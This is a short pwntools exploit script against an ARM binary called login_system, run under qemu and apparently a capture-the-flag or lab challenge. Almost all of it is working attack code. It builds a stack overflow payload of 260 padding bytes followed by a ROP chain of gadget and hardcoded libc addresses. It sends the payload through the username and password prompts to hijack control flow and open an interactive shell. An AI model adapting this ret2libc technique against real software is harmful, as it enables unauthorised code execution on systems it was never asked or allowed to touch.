from pwn import *

context(arch="arm", os="linux")
context.log_level = "debug"
# p = process(['qemu-arm', '-g', '1234', '-L', '/usr/arm-linux-gnueabi', './login_system_patch'])
p = process(['qemu-arm', '-L', '/usr/arm-linux-gnueabi', './login_system_patch'])

libc = ELF("/usr/arm-linux-gnueabi/lib/libc.so.6")
elf = ELF("./login_system")
puts_plt=elf.plt['puts']
puts_got=elf.got['puts']

pop_r3_pc_addr = 0x10730
mov_r0_r3_pop_r11_pc_addr = 0x106c0
payload1 = b'admin'+b'a'*(260-5)
payload1 += p32(pop_r3_pc_addr)
payload1 += p32(0x409aa0dc)
payload1 += p32(mov_r0_r3_pop_r11_pc_addr)
payload1 += p32(0)
payload1 += p32(0x408823d4)

p.sendlineafter("Username:", payload1)
p.sendlineafter("Password:", payload1)

p.interactive()